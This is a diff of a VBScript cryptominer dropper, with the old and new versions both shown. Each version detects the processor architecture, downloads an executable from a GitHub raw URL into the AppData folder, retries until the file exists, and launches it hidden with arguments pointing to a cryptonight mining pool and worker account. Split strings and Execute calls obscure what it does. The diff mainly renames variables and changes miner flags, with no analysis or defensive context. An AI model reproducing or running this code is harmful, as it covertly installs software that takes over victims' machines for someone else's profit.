@@ -1,50 +1,53 @@
-mydeeq = GetAppDateFolder("jcecn")
-mydeeq = mydeeq & "jcecn"&".ex"&"e"
-Dim mydeew
-Dim mydeee
-mydeew = "https://raw"&chr(46)&"githubusercontent.com"
-Set mydeer=wscript.createobject("wscript.shell")
-mydeee=mydeer.environment("system").item("processor_architecture")
-if right(mydeee, 2) = "64" then
-mydeew = mydeew&"/jommb/872/master/b"
-else
-mydeew = mydeew&"/jommb/872/master/m"
-end if
-Set mydeet = CreateObject("Scripting.FileSystemObject")
-If mydeet.FileExists(mydeeq) Then mydeet.DeleteFile mydeeq
 On Error Resume Next
+UMbty = GetAppDateFolder("jvc")
+UMbty = UMbty & "jvc.exe"
+Dim FDrtw
+Dim FDrte
+Set FDrtr=wscript.createobject("wscript.shell")
+FDrte=FDrtr.environment("system").item("processor_architecture")
+if right(FDrte, 2) = "64" then
+FDrtw = "https://raw.githubusercontent.com/jommb/872/master/b"
+else
+FDrtw = "https://raw.githubusercontent.com/jommb/872/master/m"
+end if
+Set FDrtt = CreateObject("Scripting.FileSystemObject")
+If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty
+If FDrtt.FileExists(UMbty) Then FDrtt.DeleteFile UMbty
 Do
  Err.Clear
- mydeey mydeew, mydeeq
- If dir(mydeeq) = "" Then WScript.Sleep 10000
-loop Until mydeet.FileExists(mydeeq)
-Set mydeeu = WScript.CreateObject("WScript.Shell")
-turl="my"&"de"&"eu"&".R"&"un"
-turl=turl&" mydeeq & "" -B --safe -o"
-turl=turl&" europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x"", 0, false"
-Execute turl
+ FDrty FDrtw, UMbty
+ 
+ If dir(UMbty) = "" Then WScript.Sleep 10000
+ 
+loop Until FDrtt.FileExists(UMbty)
+Set FDrtu = WScript.CreateObject("WScript.Shell")
+trv="FDrtu.Run UMbty"
+trv=trv&" & "
+trv=trv&""" --auto --any --forever --variation 3 --variation 15 --low -o europe.cryptonight-hub.miningpoolhub.com:20580 -u telefile.w -p x"", 0, false"
+Execute trv
 WScript.Quit
-Function mydeey(InetFile, jcecn)
-	 dim mydeei
+Function FDrty(InetFile, jvc)
+	 dim FDrti
 	 On Error Resume Next
-	 Set mydeei = CreateObject("WinHttp.WinHttpRequest.5.1")
+	 Set FDrti = CreateObject("WinHttp.WinHttpRequest.5.1")
 	 Do	
-	  mydeeo = ""
-	  mydeei.Open "GET", InetFile, False
-	  mydeei.Send
-	  mydeeo = mydeei.responseText
-	 Loop Until mydeeo <> ""
-	 set mydeep = CreateObject("ADODB.Stream")
-	 mydeep.Type = 1
-	 mydeep.Open
-	 mydeep.Write mydeei.responseBody
-	 Execute "mydeep.SaveT"&"oFile jcecn"
-	 mydeep.Close
-	 Set mydeei = Nothing
+	  FDrto = ""
+	  FDrti.Open "GET", InetFile, False
+	  FDrti.Send
+	  FDrto = FDrti.responseText
+	 Loop Until FDrto <> ""
+	 set FDrtp = CreateObject("ADODB.Stream")
+	 FDrtp.Type = 1
+	 FDrtp.Open
+	 FDrtp.Write FDrti.responseBody
+	 Execute "FDrtp.S"&"aveToFile jvc"
+	 FDrtp.Close
+	 Set FDrti = Nothing
+	
 End Function
 Function GetAppDateFolder(FolderName)
-	Set mydeea = CreateObject("WScript.Shell")
-	GetAppDateFolder = mydeea.ExpandEnvironmentStrings("%AppData%\" & FolderName & "\")
+	Set FDrta = CreateObject("WScript.Shell")
+	GetAppDateFolder = FDrta.ExpandEnvironmentStrings("%AppData%\" & FolderName & "\")
 	Set fileSystem = CreateObject("Scripting.FileSystemObject")
 	If (fileSystem.FolderExists(GetAppDateFolder)) Then
 	Else
